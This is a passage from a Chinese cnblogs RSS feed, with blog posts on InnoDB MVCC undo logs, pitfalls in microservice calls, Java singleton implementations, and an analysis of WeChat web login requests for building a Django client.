&lt;p class=&quot;image-container-fill&quot;&gt;&lt;span&gt;　　如图，开始只有最下面一行记录，&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;image-container-fill&quot;&gt;&lt;span&gt;　　当事务1更改该行记录时，会进行如下操作：&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;image-container-fill&quot;&gt;&lt;span&gt;　　事务1 先用排它锁锁住该行记录(当前读,读到最新数据然后独占),复制到undolog，即图中第二行记录；再更新字段, 把自己的事务id填入DB_TRX_ID, 让回滚指针DB_ROLL_PTR 指向undolog中修改前的原数据(开始只有最下面一行记录)&lt;br/&gt;　　事务2操作也是一样, 产生了第三行记录。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;image-view&quot; data-width=&quot;1255&quot; data-height=&quot;598&quot;&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/4930604-5618611d9e5b1f1d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp&quot; alt=&quot;&quot; data-original-src=&quot;//upload-images.jianshu.io/upload_images/4930604-5618611d9e5b1f1d.png&quot; data-original-width=&quot;1255&quot; data-original-height=&quot;598&quot; data-original-format=&quot;image/png&quot; data-original-filesize=&quot;293796&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
</description>
<pubDate>Wed, 17 Apr 2019 16:19:00 +0000</pubDate>
<dc:creator>wwcom123</dc:creator>
<og:description>当前读: select...lock in share mode (共享读锁) select...for update update , delete , insert 当前读, 读取的是最新版本,</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wwcom123/p/10727194.html</dc:identifier>
</item>
<item>
<title>微服务间的调用和应用内调用有啥区别 - stoneFang</title>
<link>http://www.cnblogs.com/stoneFang/p/10727191.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/stoneFang/p/10727191.html</guid>
<description>&lt;p&gt;目前大部分的系统架构都是微服务架构，就算没有注册中心、服务管理，也肯定是多个服务，单体服务比较少了。&lt;br/&gt;大家平时需要在应用内调用rpc接口也比较多，那么有没有思考过微服务之间的调用和应用内直接调用有什么区别呢？面试时是不是经常被被问到微服务呢，本篇文章针对&lt;code&gt;微服务间的方法调用和应用内方法调用的有啥区别&lt;/code&gt;这个很小的点，谈谈我的经验&lt;/p&gt;

&lt;p&gt;先从单体应用说起&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190417215139955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9mYW5nemhhbmcuYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;&lt;strong&gt;单体应用&lt;/strong&gt;&lt;br/&gt;单体引用通过一个服务节点直接组装好数据，返回给调用者。所有的方法调用都发生在应用内部。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190417215825522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9mYW5nemhhbmcuYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;&lt;strong&gt;微服务应用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;商品详情服务需要调用商品，营销等多个服务组装好商品详情页的数据&lt;/p&gt;
&lt;p&gt;微服务调用和应用内调用不同点在于它是跨进程的，甚至是跨节点的，这意味着什么呢&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;使用k8s编排微服务时，我们可以让不同的服务放在同一个节点的不同docker container上，但是考虑到网络不可靠，和容灾，&lt;br/&gt;服务之间不可避免会放到不同的节点/机架上，所以下文都以跨节点来讨论&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;意味着两点&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;对外部有了依赖&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;如果是跨节点，就有了网络调用。我们知道网络都是不可靠的&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;关于网络有几个著名的错误推论&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;The network is reliable（网络是可靠的）&lt;br/&gt;Latency is zero.（延迟可以为0）&lt;br/&gt;Bandwidth is infinite（带宽是无限的）&lt;br/&gt;The network is secure（网络是安全的）&lt;br/&gt;Topology doesn't change（网络拓扑结构不会变）&lt;br/&gt;Transport cost is zero（网络传输耗时为0）&lt;br/&gt;The network is homogeneous（网络是同类的）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;存在上述两个问题后，那么我们需要在写微服务间方法调用时注意什么的&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对外部有了依赖&lt;/strong&gt;&lt;br/&gt;微服务架构设计中有一条重要的原则叫&lt;code&gt;严出宽进&lt;/code&gt;，严出意思就是说你提供给其他服务的东西要尽可能的进行严格的校验。宽进就是你调用别人的接口要宽容，兼容各种情况。比如说你需要考虑别人的节点down了/api超时/api不可用等等因素。&lt;/p&gt;
&lt;p&gt;为了解决这个问题，我们必须要针对具体业务，&lt;strong&gt;分析依赖类型，是强依赖还是弱依赖&lt;/strong&gt;，强依赖包装成自己的服务异常返回码/或者直接告诉前端调用不可用。弱依赖，catch所有异常，无论依赖方发生什么，不能影响我的接口返回。&lt;/p&gt;
&lt;p&gt;此外，我依赖的服务某段时间内接口错误率很高，调用方还在不停的发送请求，那么就会一直得到错误的结果，这时候这些请求其实是无效的，所以这时候需要客户端&lt;strong&gt;熔断&lt;/strong&gt;，不再去调用服务方，给服务方恢复的时间，等过段时间再去重试，发现服务方可用时，再去调用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;网络调用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;网络调用是耗时的，所以我们需要利用池化技术，复用连接，比如在单体应用中我们需要与数据库连接，会利用到数据库连接池来提高数据操作效率。那么微服务调用也是这么个道理，我们与其他服务建议http/tcp连接，也需要建立连接池。另外一个服务可能会依赖多个微服务，不能因为和某个服务之间的连接出了问题，影响到与其他服务的连接，所以需要做&lt;strong&gt;连接池隔离。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;服务间调用有可能失败，所以我们需要有重试机制，比如因为网络抖动引发的超时问题，我们可以通过重试提高API的可用性。&lt;br/&gt;但是思考一下坏的情况，某段时间网络或者服务端真的有问题了。客户端超时时间设置的很大的话，客户端等待的时间就会很长，然后再加上重试机制，就会将客户端的连接占满，造成客户端相关API不可用。&lt;/p&gt;

&lt;p&gt;分享几个微服务调用的故障案例，帮助大家进行场景化思考&lt;br/&gt;&lt;code&gt;为啥要分享这些案例呢，因为TMD的这些案例都是血的教训，造成线上故障，不是我的错，却要我背锅&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;案例1：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;新上线了一个产品功能，需要推广，放在另外一个流量比较大的产品模块中，展示一些我们产品功能的数据。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190417235730248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9mYW5nemhhbmcuYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;出于某种原因，我们的服务mock了rpc调用数据，返回null。结果其他服务整个前台页面挂了，挂了，挂了。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;典型的强弱依赖问题，调用方没有处理好依赖类型，明明是一个弱依赖没有处理，变成了强依赖，造成功能挂了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;案例2:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;依赖的某个服务需要根据主键&lt;code&gt;List&amp;lt;id&amp;gt;&lt;/code&gt;来批量查询，依赖服务内部做分库分表拆分，升级了sdk&lt;br/&gt;在提供的sdk client中做分表路由，将批量id拆分成N个rpc调用。这么做的原因是防止批量查询把数据库连接池打爆。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190417224530972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9mYW5nemhhbmcuYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;忽略了网络调用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;案例3&lt;/strong&gt;&lt;br/&gt;别人调我们的服务的某个接口，这个接口RT(耗时时间)P95 &amp;lt; 30ms。但是客户端调用的超时时间设置成了500ms，在某次不知道是什么原因的情况下，调用方的连接大量block，造成线程阻塞，相关API不可用。&lt;strong&gt;看服务方监控，该接口返回时间正常，服务方没有任何异常。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;没有正确的设置超时时间&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;微服务调用和应用内调用有很大的区别，我们不能在进行服务间调用时无感知，需要知道它面临的问题&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;对外部有了依赖，外部是不可靠的&lt;/li&gt;
&lt;li&gt;有了网络调用&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;解法可以精炼为4条&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;根据业务需要，判断依赖类型，做好对应的降级&lt;/li&gt;
&lt;li&gt;设置合理的超时时间&lt;/li&gt;
&lt;li&gt;调用方需要对不同的服务调用设置连接池隔离&lt;/li&gt;
&lt;li&gt;调用方需要有熔断机制&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这些问题看似都很简单，但是根据我的观察，真的有很多人写了无数的rpc调用，还没有意识到这些问题。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关注【方丈的寺院】，与方丈一起开始技术修行之路&lt;/strong&gt;&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190418000000125.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9mYW5nemhhbmcuYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 17 Apr 2019 16:18:00 +0000</pubDate>
<dc:creator>stoneFang</dc:creator>
<og:description>摘要 目前大部分的系统架构都是微服务架构，就算没有注册中心、服务管理，也肯定是多个服务，单体服务比较少了。 大家平时需要在应用内调用rpc接口也比较多，那么有没有思考过微服务之间的调用和应用内直接调用</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/stoneFang/p/10727191.html</dc:identifier>
</item>
<item>
<title>【单例模式】java实现 - Ivo-oo</title>
<link>http://www.cnblogs.com/ivoo/p/10725893.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ivoo/p/10725893.html</guid>
<description>&lt;p&gt;&lt;strong&gt;概述：&lt;/strong&gt;确保一个类只有一个实例，而且自行实例化并向整个系统提供这个实例。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关键点：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;构造函数不对外开放，一般为private。&lt;/li&gt;
&lt;li&gt;通过一个静态方法或者枚举返回单例类对象。&lt;/li&gt;
&lt;li&gt;确保单例类的对象有且只有一个，尤其在多线程情况下。&lt;/li&gt;
&lt;li&gt;确保单例类对象在反序列化时不会重新构建对象&lt;/li&gt;
&lt;/ol&gt;&lt;h3&gt;（1）饿汉模式&lt;/h3&gt;
&lt;p&gt;饿汉式单例模式（在类加载时就完成了初始化，所以类加载较慢，但获取对象的速度快）&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; EagerSingle {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;饿汉模式单例
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;在类加载时就完成了初始化，所以类加载较慢，但获取对象的速度快&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; EagerSingle single = &lt;span&gt;new&lt;/span&gt; EagerSingle();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;静态私有成员，已初始化&lt;/span&gt;

    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; EagerSingle() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;私有构造函数&lt;/span&gt;
&lt;span&gt;    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; EagerSingle getInstance() {&lt;span&gt;//&lt;/span&gt;&lt;span&gt;静态，不用同步（类加载时已初始化，不会有多线程的问题）&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt;&lt;span&gt; single;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;（2）懒汉模式&lt;/h3&gt;
&lt;p&gt;懒汉模式声明一个静态对象，并且在用户第一次调用getInstance时进行初始化。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; EagerSingleton {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;饿汉模式单例
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;在类加载时就完成了初始化，所以类加载较慢，但获取对象的速度快&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; EagerSingleton instance = &lt;span&gt;new&lt;/span&gt; EagerSingleton();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;静态私有成员，已初始化&lt;/span&gt;

    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; EagerSingleton() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;私有构造函数&lt;/span&gt;
&lt;span&gt;    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; EagerSingleton getInstance() {&lt;span&gt;//&lt;/span&gt;&lt;span&gt;静态，不用同步（类加载时已初始化，不会有多线程的问题）&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt;&lt;span&gt; instance;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;synchronized关键字保证了同步，在多线程情况下单例的唯一性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;存在问题：&lt;/strong&gt;即使instance已经存在，每次调用getInstance依然会进行同步，这样就会消耗不必要的资源。&lt;/p&gt;
&lt;p&gt;总结：懒汉模式的&lt;strong&gt;优点是&lt;/strong&gt;只有在使用时才会实例化单例对象，在一定程度上节约了资源；&lt;strong&gt;缺点是&lt;/strong&gt;第一次加载时需要进行实例化，反应稍慢；&lt;span&gt;最大问题&lt;/span&gt;是每次调用都会进行同步吗，造成不必要的同步开销。这种模式一般不建议使用。&lt;/p&gt;
&lt;h3&gt;（3）Double Check Lock（DCL）双重校验锁&lt;/h3&gt;
&lt;p&gt;DCL方式实现单例的优点是既能在需要时才初始化单例，又能保证线程安全，且单例对象初始化后调用getInstance不进行同步锁。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DCLSingleton {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Double Check Lock单例模式
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;懒汉模式的改进
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;但仍然存在隐患&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DCLSingleton instance = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; DCLSingleton() {
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; DCLSingleton getInstance() {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (instance == &lt;span&gt;null&lt;/span&gt;) {&lt;span&gt;//&lt;/span&gt;&lt;span&gt;第一层判断主要是为了避免不必要的同步&lt;/span&gt;
            &lt;span&gt;synchronized&lt;/span&gt; (DCLSingleton.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (instance == &lt;span&gt;null&lt;/span&gt;) {&lt;span&gt;//&lt;/span&gt;&lt;span&gt;第二层判空是为了在null情况下创建实例&lt;/span&gt;
                    instance = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DCLSingleton();
                }
            }
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; instance;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;亮点在getInstance方法上，有两次判空。第一层判断主要是为了避免不必要的同步，第二层判空是为了在null情况下创建实例。&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;执行下面这行代码&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
single = new Singleton();
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;实际上并不是一个原子操作，这句代码实际做了3件事&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;给Singleton的实例分配内存；&lt;/li&gt;
&lt;li&gt;调用Singleton()的构造函数，初始化成员字段&lt;/li&gt;
&lt;li&gt;将instance对象指向分配的内存空间（此时instance已经不是null了）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;问题：&lt;/strong&gt;但由于java编译器允许处理器乱序执行，上述顺序2、3是不能保证的，可能是1-2-3也可能是1-3-2；如果是后者，3执行了已经非空，再走2会出现问题，这就是&lt;span&gt;DCL失效&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解决：&lt;/strong&gt; volatile关键字&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;    private static DCLSingleton instance = null;&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;volatile&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DCLSingleton instance = &lt;span&gt;null&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;只需要加上volatile关键字，如上述代码操作就可以保证instance对象每次都是从主内存中读取的，就可以采用DCL来完成单例模式了。当然，volatile或多或少会影响到性能，但考虑到程序的正确性，牺牲点性能还是值得的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;总结：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;优点：资源利用率高，第一次执行fetInstance时单例对象才会被实例化，效率高。&lt;/li&gt;
&lt;li&gt;缺点：第一次加载时反应稍慢；由于java内存模型的原因偶尔会失败，在高并发环境下也有一定的缺陷，虽然概率很小。&lt;/li&gt;
&lt;li&gt;DCL模式是使用最多的单例实现方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;（4）静态内部类单例模式&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; InnerSingleton {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; InnerSingleton() {
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; InnerSingleton getInstance() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; InnerSingletonHolder.instance;
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 静态内部类
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; InnerSingletonHolder {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; InnerSingleton instance = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; InnerSingleton();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;总结：&lt;/strong&gt;第一次加载InnerSingleton类时并不会初始化instance，只有在第一次调用InnerSingleton的getInstance方法时才会导致instance被初始化。因此，第一次调用getInstance方法会导致虚拟机加载InnerSingleton类，这种方法不仅能保证线程安全，也能够保证单例对象的唯一性，同时也延迟了单例的实例化，所以这也是一种推荐的单利模式实现方法&lt;/p&gt;

&lt;h3&gt;（5）枚举单例&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;enum&lt;/span&gt;&lt;span&gt; EnumSingleton {
    INSTANCE;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; doSomething() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;do sth ...&lt;/span&gt;
&lt;span&gt;    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;震惊？没错！就是枚举！&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;写法简单；枚举在java种与普通类是一样的，不仅能够有字段，还能够有自己的方法。最重要的是默认枚举实例的创建时线程安全的，并且在任何情况下都是一个单例。&lt;/li&gt;
&lt;li&gt;为什么这么说呢？　　在上述的集中单例模式实现种，在一个情况下他们都会出现重新创建对象的情况，那就是&lt;span&gt;反序列化&lt;/span&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;补充：&lt;/strong&gt;　通过序列化可以将一个单例的实例对象写到磁盘，然后再读回来，从而有效的获取一个实例。即使构造函数是私有的，反序列化时依然可以通过特殊的途径去创建类的一个新的实例，相当于调用该类的构造函数。&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Wed, 17 Apr 2019 16:17:00 +0000</pubDate>
<dc:creator>Ivo-oo</dc:creator>
<og:description>概述：确保一个类只有一个实例，而且自行实例化并向整个系统提供这个实例。 关键点： （1）饿汉模式 饿汉式单例模式（在类加载时就完成了初始化，所以类加载较慢，但获取对象的速度快） （2）懒汉模式 懒汉模</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/ivoo/p/10725893.html</dc:identifier>
</item>
<item>
<title>requests+django+bs4实现一个web微信的功能 - bainianminguo</title>
<link>http://www.cnblogs.com/bainianminguo/p/10727084.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bainianminguo/p/10727084.html</guid>
<description>&lt;p&gt;前言：&lt;/p&gt;
&lt;p&gt;　　今天我们利用requests模块+django+bs4浏览器来实现一个web微信的基本功能，主要实现的功能如下&lt;/p&gt;
&lt;p&gt;　　a、实现返回二维码&lt;/p&gt;
&lt;p&gt;　　b、实现手机扫码后二维码变成变成头像&lt;/p&gt;
&lt;p&gt;　　c、实现手机点击登陆成功显示微信的最近联系人&lt;/p&gt;
&lt;p&gt;　　d、实现显示所有的联系人&lt;/p&gt;
&lt;p&gt;　　e、实现发送消息&lt;/p&gt;

&lt;p&gt;　　下面我们就开始实现上述的功能，在看这篇博客的之前，读者朋友需要去了解一下长轮询的知识，因为wei微信的登陆就用到了长轮询，首先我们先把web登陆的流程梳理一下，然后在实现我们的功能&lt;/p&gt;

&lt;h3&gt;一、web微信登陆分析&lt;/h3&gt;
&lt;h4&gt;1、web微信二维码分析&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417221413796-654160456.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; a、首先拿到url，这个请求是get请求&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
https://login.wx2.qq.com/jslogin?appid=wx782c26e4c19acffb&amp;amp;redirect_uri=https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxnewloginpage&amp;amp;fun=new&amp;amp;lang=zh_&amp;amp;_=1555510256420
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span class=&quot;tabpanel-summary-value textbox-input devtools-monospace&quot;&gt;这个url很好构建，只有1555510256420这个参数需要我们认为生成，其他他就是时间戳*1000，然后取整，生成的方法如下&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
t = int(time.time() * 1000)
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;b、分析这个url的返回值&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417221646895-837071915.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;c、查看网页的源代码，看下这个二维码到底是什么&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417221749912-89950448.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;看下img标签的src属性，有没有注意到，src的这一段字符串oaKKJgJRhA==，是我们返回二维码的url返回的字符串，所以我们就可以拼接出来二维码这个图片的src的地址&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
https://login.weixin.qq.com/qrcode/oaKKJgJRhA==　　
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;2、等待用户扫码&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417222934676-329183336.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;这里就用到了一个长轮询，如果客户一直没有扫码，则会hang住，等待客户的扫码&lt;/p&gt;
&lt;p&gt;a、先来分析一下url&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
https://login.wx2.qq.com/cgi-bin/mmwebwx-bin/login?loginicon=true&amp;amp;uuid=oeoQNe1EiA==&amp;amp;tip=1&amp;amp;r=-732967182&amp;amp;_=1555511127069
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;这个url有2个地方需要我们来构建&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417223138370-812314534.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 第一个参数就上一步返回的字符串，第二个参数就是一个还是一个时间戳&lt;/p&gt;
&lt;p&gt;b、在来看下这个url返回了什么&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417223256303-946138072.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 只有一个状态码408&lt;/p&gt;
&lt;p&gt; 结论：如果url的返回的code为408，则表示等待用户扫码&lt;/p&gt;
&lt;h4&gt;3、web微信显示头像分析&lt;/h4&gt;
&lt;p&gt;手机扫码后，二维码变成头像&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417222422953-49483062.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;a、先来分析url&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
https://login.wx2.qq.com/cgi-bin/mmwebwx-bin/login?loginicon=true&amp;amp;uuid=Qfn4ldhuNQ==&amp;amp;tip=1&amp;amp;r=-732688468&amp;amp;_=1555510848123
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;这个url和上面的url一样，所以我们知道，第一步返回的字符串非常重要，所以我们要把这段字符串放在session中&lt;/p&gt;
&lt;p&gt;b、在来看下url的返回值&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417223608883-1373617650.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

